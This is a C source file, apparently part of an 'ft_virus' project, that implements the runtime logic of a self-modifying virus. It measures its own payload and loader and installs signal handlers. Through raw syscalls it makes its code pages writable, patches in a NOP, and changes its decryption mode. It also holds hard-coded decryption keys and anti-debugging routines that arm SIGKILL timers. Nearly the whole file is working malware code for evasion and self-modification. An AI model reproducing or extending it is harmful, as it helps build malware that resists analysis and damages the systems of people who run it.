#include "ft_virus.h"

void		Main_Blaster ( void ) {

	/* -- Get size of viruses. (PAYLOAD) -- */
	uint32_t 	size = ((uint32_t)&Blaster_end - (uint32_t)&VIRUSE_HEADER);	
	unsigned char	*p = (unsigned char*)&Blaster_end;
	for( ; ; ++p, ++size)
		if (*p == 0XC3) { ++size; break; }

	/* -- Get size of loader. -- */
	uint32_t	__attribute__((unused)) size_loader = ((uint32_t)&Main_Blaster - (uint32_t)&loader);

	/* -- Get date -- */
	struct timeval __attribute__((unused))tv = {0};
	if ( Syscall2( __NR_gettimeofday, (long) &tv, 0 ) != 0) {

	}

	// ---------------------------- //
	// -- Get pid of the process -- //
	// ---------------------------- //
	long pid = Syscall0( __NR_getpid );

	// ------------------------------ //
	// -- Capture signals (SIGINT) -- //
	// ------------------------------ //
	Syscall2( __NR_signal, SIGINT, (long)&security_viruse );

	// ---------------------------------------------------- //
	// -- Activate the new mode of the decryption method -- //
	// ---------------------------------------------------- //
	Syscall2( __NR_kill, pid, SIGINT );


	/*char __attribute__((unused))*user_data = (char *)Syscall6(__NR_mmap2, 0, USER_MEMORY_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 );	
	if ( (long)user_data == -ENOMEM ) {
		// -- Memory unavailable -- //
		Syscall1( __NR_exit, 1 );
	}*/
}

void 	security_viruse (int __attribute__((unused))sig) {
	
	t_header	*header = NULL;
	struct sigevent ev = {0};
	timer_t		timer1 = {0};
	ev.sigev_notify = SIGEV_SIGNAL;
	ev.sigev_signo  = SIGKILL;
	struct itimerspec itimer = {0};
			itimer.it_value.tv_sec = 3;
	char *address_header = (void *) (((uintptr_t)&VIRUSE_HEADER) & ~(0X1000 - 1)), *addr = (char *)&loader;

	const unsigned char __attribute__((unused))*keys[] =
	{
		(unsigned char[0X10]){0XA0,0X7C,0X57,0XB3,0X0F,0X6B,0X46,0X23,0X7E,0XD9,0X35,0X11,0XEC,0XC9,0X25,0X18},
		(unsigned char[0X10]){0X53,0X2A,0XE1,0XD3,0X0A,0X2E,0X87,0XB9,0X40,0X0B,0X36,0X54,0XDD,0X01,0XE0,0XEE},
		(unsigned char[0X10]){0XCF,0X71,0XC1,0X3E,0X94,0XA1,0X69,0XDE,0X44,0XB3,0X1A,0X3B,0X0D,0X28,0X1D,0XC4},
	};
	switch(sig) {

		case SIGUSR1:
			/* ----------------------------- */
			/* SECURITY WITH PROC DIRECTORY. */
			/* ----------------------------- */
			//Syscall3( __NR_mprotect, (long)function_main_blaster, 0X1000, PROT_READ | PROT_WRITE | PROT_EXEC);

			if ( Syscall3( __NR_timer_create, CLOCK_REALTIME, (long)&ev, (long)&timer1 ) != 0) {

			}
	
			if ( Syscall4( __NR_timer_settime, (long)timer1, 0, (long )&itimer, 0 ) != 0 ) {
		
			}
			DEBUGGING1();
			//Syscall3( __NR_mprotect, (long)function_main_blaster, 0X1000, PROT_READ | PROT_EXEC);
			itimer.it_value.tv_sec = 0;
			if ( Syscall4( __NR_timer_settime, (long)timer1, 0, (long )&itimer, 0 ) != 0 ) {
		
			}
				

			break;

		case SIGUSR2:
			if ( Syscall3( __NR_timer_create, CLOCK_REALTIME, (long)&ev, (long)&timer1 ) != 0) {

			}
	
			if ( Syscall4( __NR_timer_settime, (long)timer1, 0, (long )&itimer, 0 ) != 0 ) {
		
			}
			DEBUGGING0();
			itimer.it_value.tv_sec = 0;
			if ( Syscall4( __NR_timer_settime, (long)timer1, 0, (long )&itimer, 0 ) != 0 ) {
		
			}
			break;

		case SIGINT:
			// -- [FR] Ce code ci-dessus change la façon dont le décryptage fonctionne -- //
			// -- [EN] This code above changes the way the decryption works -- //
			addr -= sizeof(t_header);
			header = (t_header *)addr;
			Syscall3( __NR_mprotect, (long)address_header, 0X1000, PROT_READ | PROT_WRITE | PROT_EXEC);
			header->mod = 0X1;
			addr = (char *)&Main_Blaster-1;
			*addr = 0X90;
			Syscall3( __NR_mprotect, (long)address_header, 0X1000, PROT_READ | PROT_EXEC);
			break;

		case SIGSEGV:
			addr -= sizeof(t_header);
			header = (t_header *)addr;
			for(int i=0; i<16; i++) {
				printf("%.2X ", (unsigned char)keys[header->pos][i]);
			}
			printf("\n");

			Syscall3( __NR_mprotect, (long)address_header, 0X1000, PROT_READ | PROT_WRITE | PROT_EXEC);
			++header->pos;
			printf("%.2x\n", (unsigned char)header->pos);
			Syscall3( __NR_mprotect, (long)address_header, 0X1000, PROT_READ | PROT_EXEC);
			break;

		default:
			break ;
	}

}
